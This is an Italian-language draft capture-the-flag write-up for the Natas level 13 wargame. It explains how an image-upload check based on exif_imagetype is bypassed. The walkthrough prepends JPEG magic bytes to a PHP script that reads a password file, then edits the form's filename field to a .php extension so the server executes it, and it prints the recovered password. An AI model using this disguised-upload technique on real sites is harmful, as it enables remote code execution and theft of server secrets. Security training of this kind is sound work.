@@ -1,0 +1,112 @@
+reporto livello 13:
+
+
+vulnerablita: abbiamo fatto una post con un file php malevolo camuffato da jpg
+
+
+exploit: il livello si presenta principalemtne uguale a natas12 ma questa volta 
+viene aggiunto un controllo sull'esntensione del file con exif_imagetype.
+
+
+
+Codice sorgente di uno script reso disponibile dalla pagina:
+
+<?php
+
+function genRandomString() {
+    $length = 10;
+    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
+    $string = "";
+
+    for ($p = 0; $p < $length; $p++) {
+        $string .= $characters[mt_rand(0, strlen($characters)-1)];
+    }
+
+    return $string;
+}
+
+function makeRandomPath($dir, $ext) {
+    do {
+    $path = $dir."/".genRandomString().".".$ext;
+    } while(file_exists($path));
+    return $path;
+}
+
+function makeRandomPathFromFilename($dir, $fn) {
+    $ext = pathinfo($fn, PATHINFO_EXTENSION);
+    return makeRandomPath($dir, $ext);
+}
+
+if(array_key_exists("filename", $_POST)) {
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+
+    $err=$_FILES['uploadedfile']['error'];
+    if($err){
+        if($err === 2){
+            echo "The uploaded file exceeds MAX_FILE_SIZE";
+        } else{
+            echo "Something went wrong :/";
+        }
+    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+        echo "File is too big";
+    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+        echo "File is not an image";
+    } else {
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+        } else{
+            echo "There was an error uploading the file, please try again!";
+        }
+    }
+} else {
+?>
+
+
+
+Analizzando il comportametno di exif_imagetype notiamo che legge soltanto i primi byte
+(magic bytes? controlla) per determianter il tipo di file immagine.
+
+E' possibile quindi "camuffare" (usiamo un termine tecnico) il file per farlo sembrare
+jpg senza compromettere la sua integrita'
+
+(spiega come mai e' possibile aggiugnere byte nel codice che non vengono letti e interpe
+tati da php e lo script funiozna lo stesso)
+
+
+
+Dunque dopo aver creato questo scritp unendo byte + script:
+
+
+Byyes jpg: FF D8 FF E0
+
+scritp:
+<?php
+	echo file_get_contents('/etc/natas_webpass/natas14');
+?>
+
+Risultato: 
+����<?php
+	echo file_get_contents('/etc/natas_webpass/natas14');
+?>
+
+e modificando:
+
+<form enctype="multipart/form-data" action="index.php" method="POST">
+<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
+<input type="hidden" name="filename" value="19f4ul911b.jpg" />
+Choose a JPEG to upload (max 1KB):<br/>
+<input name="uploadedfile" type="file" /><br />
+<input type="submit" value="Upload File" />
+</form>
+
+
+nel campo form value=".jpg" in ".php" possiamo "presonalizzare" la richiesta di post
+lato client in modo da far arrivare al server quello che vogliamo noi. (spiega meglio questa parte)
+
+
+Cosi viene stampata la password: A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8
+
+
+
+
+
